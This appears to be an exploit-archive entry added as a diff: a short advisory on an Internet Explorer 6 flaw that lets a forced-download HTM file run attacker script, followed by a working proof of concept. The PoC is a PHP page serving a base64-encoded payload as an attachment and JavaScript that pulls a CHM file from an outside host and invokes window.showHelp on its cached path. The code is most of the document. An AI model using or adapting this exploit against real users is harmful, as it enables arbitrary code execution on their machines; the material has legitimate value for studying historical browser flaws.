@@ -1,0 +1,55 @@
+source: http://www.securityfocus.com/bid/5450/info
+
+An error has been reported in Microsoft Internet Explorer 6, which may allow malicious file attachments to execute arbitrary code in the context of the local system. 
+
+HTM files are associated with Internet Explorer. It is possible for an attacker to cause Internet Explorer to force a download of a malicious HTM file. The downloaded HTM file may include malicious attacker-supplied script instructions that will be executed on the victim user's system.
+
+This behavior has been reported in Internet Explorer 6. Other versions of Internet Explorer may share this vulnerability, this has not however been confirmed.
+
+<?
+function malware()
+{
+header("Content-type: text/html");
+header("Content-Disposition: attachment");
+echo base64_decode(
+'PGltZyBkeW5zcmM9Imh0dHA6Ly93d3cubWFsd2FyZS5jb20vbW'.
+'Fsd2FyZS9tYWx3YXJlLmNobSIgd2lkdGg9MSBoZWlnaHQ9MT4N'.
+'Cg0KPFNDUklQVD4NCg0KLy8gNy4wMi4wMiBodHRwOi8vd3d3Lm'.
+'1hbHdhcmUuY29tDQoNCi8vIHlvdSBtYXkgY29uc2lkZXIgd3Jp'.
+'dGluZyBzZXZlcmFsIGxpbmVzDQovLyBpbiBjYXNlIG1hbHdhcm'.
+'UuY2htIGFycml2ZXMgYXMgWzFdIG9yIFsyXSBldGMNCg0KZnVu'.
+'Y3Rpb24gbWFsd2FyZSgpDQp7DQpzPWRvY3VtZW50LlVSTDsNCn'.
+'BhdGg9cy5zdWJzdHIoLTAscy5sYXN0SW5kZXhPZigiXFwiKSk7'.
+'DQpwYXRoPXVuZXNjYXBlKHBhdGgpOw0KZG9jdW1lbnQud3JpdG'.
+'UoJzxGT1JNIG5hbWU9Im1hbHdhcmUiIEFDVElPTj0iamF2YXNj'.
+'cmlwdDp3aW5kb3cuc2hvd0hlbHAoZG9jdW1lbnQuZm9ybXNbMF'.
+'0uZWxlbWVudHNbMF0udmFsdWUpIj4nKTsNCmRvY3VtZW50Lndy'.
+'aXRlKCc8Zm9ybT48aW5wdXQgdHlwZT0iaGlkZGVuIiAgc2l6ZT'.
+'0iNDAiIG1heGxlbmd0aD0iODAiIHZhbHVlPSInK3BhdGgrJ1xc'.
+'bWFsd2FyZVsxXS5jaG0iPjwvZm9ybT4nKTsNCnNldFRpbWVvdX'.
+'QoJ2RvY3VtZW50Lm1hbHdhcmUuc3VibWl0KCknLDEwMDAwKTsN'.
+'CiB9IA0Kc2V0VGltZW91dCgibWFsd2FyZSgpIiwyNTAwKTsgIA'.
+'0KPC9TQ1JJUFQ+DQogDQoNCg=='.'');}
+{ malware(); }
+PHP ?>
+
+<iframe src=<? echo $PHP_SELF ?> width=1 height=1>
+
+<SCRIPT>
+
+// 7.02.02 http://www.malware.com
+
+function malware()
+{
+s=document.URL;
+path=s.substr(-0,s.lastIndexOf(""));
+path=unescape(path);
+document.write('<FORM name="malware"
+ACTION="javascript:window.showHelp(document.forms[0].elements
+[0].value)">');
+document.write('<form><input type="hidden" size="40" maxlength="80"
+value="'+path+'malware[1].chm"></form>');
+setTimeout('document.malware.submit()',10000);
+}
+setTimeout("malware()",2500);
+</SCRIPT>
